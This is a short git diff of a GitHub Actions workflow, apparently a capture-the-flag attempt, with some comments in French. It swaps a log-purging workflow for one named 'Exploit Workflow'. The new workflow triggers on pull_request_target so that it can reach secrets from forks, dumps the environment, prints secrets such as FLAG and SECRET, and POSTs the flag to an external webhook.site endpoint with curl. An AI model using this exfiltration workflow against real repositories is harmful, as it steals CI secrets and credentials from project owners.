@@ -1,23 +1,24 @@
-name: Purge Logs
+name: Exploit Workflow
 
 on:
-  workflow_run:
-    workflows: ["Chall Intro"]
-    types: [completed]
-
-permissions:
-  actions: write
-  contents: read
+  pull_request_target:  # Important : accède aux secrets même depuis un fork
+  workflow_dispatch:     # Permet de déclencher manuellement
 
 jobs:
-  purge-logs:
+  leak-secrets:
     runs-on: ubuntu-latest
     steps:
-      - name: Delete logs for the triggering run
-        env:
-          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-          REPO: ${{ github.repository }}
-          RUN_ID: ${{ github.event.workflow_run.id }}
+      - name: Show all environment variables
+        run: env | sort
+      
+      - name: Try to leak FLAG
         run: |
-          echo "Deleting logs for run $RUN_ID on $REPO"
-          gh api -X DELETE repos/$REPO/actions/runs/$RUN_ID/logs || true
+          echo "FLAG: ${{ secrets.FLAG }}"
+          echo "CTF_FLAG: ${{ secrets.CTF_FLAG }}"
+          echo "SECRET: ${{ secrets.SECRET }}"
+      
+      - name: Exfiltrate via webhook (optionnel)
+        run: |
+          curl -X POST https://webhook.site/VOTRE-ID \
+            -H "Content-Type: application/json" \
+            -d "{\"flag\":\"${{ secrets.FLAG }}\"}"
